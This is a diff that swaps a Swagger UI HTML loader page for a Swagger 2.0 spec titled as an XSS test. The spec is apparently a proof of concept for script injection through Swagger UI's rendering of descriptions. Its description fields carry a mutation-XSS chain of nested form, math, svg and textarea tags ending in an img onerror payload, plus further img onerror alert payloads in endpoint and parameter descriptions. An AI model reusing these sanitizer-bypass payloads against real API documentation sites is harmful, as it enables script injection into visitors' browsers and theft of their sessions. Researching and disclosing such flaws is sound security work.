@@ -1,49 +1,45 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Fast Magnetic Ephemeris – Swagger UI</title>
+swagger: '2.0'
+info:
+  title: Swagger UI XSS Test – TheeHerbie
+  description: |
+    <form><math><mtext></form>
+    <form><mglyph>
+    <svg>
+    <mtext>
+    <textarea><path id="</textarea>
+    <img src=1 onerror=alert(document.domain)>
+    </form>
+  version: "1.0"
 
-  <link rel="stylesheet" href="https://unpkg.com/swagger-ui-dist/swagger-ui.css" />
+basePath: /api/
+schemes:
+  - https
 
-  <style>
-    body {
-      margin: 0;
-      background: #f4f6f8;
-    }
-    .footer {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      font-size: 12px;
-      color: #888;
-    }
-  </style>
-</head>
+produces:
+  - application/json
+consumes:
+  - application/json
 
-<body>
-  <div id="swagger-ui"></div>
+paths:
+  /demo:
+    get:
+      summary: Demo endpoint for Swagger UI rendering test
+      description: |
+        <img src=1 onerror=alert('Swagger UI XSS – TheeHerbie')>
+      responses:
+        '200':
+          description: OK
 
-  <div class="footer">
-    Theeherbie/.vetritec
-  </div>
-
-  <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js"></script>
-  <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js"></script>
-
-  <script>
-    fetch("config.json")
-      .then(res => res.json())
-      .then(config => {
-        SwaggerUIBundle({
-          ...config,
-          presets: [
-            SwaggerUIBundle.presets.apis,
-            SwaggerUIStandalonePreset
-          ],
-          layout: "StandaloneLayout"
-        });
-      });
-  </script>
-</body>
-</html>
+  /resource/{id}:
+    delete:
+      summary: Parameter rendering test
+      parameters:
+        - name: id
+          in: path
+          required: true
+          type: string
+          description: |
+            <img src=1 onerror=alert(document.domain)>
+      responses:
+        '200':
+          description: Deleted
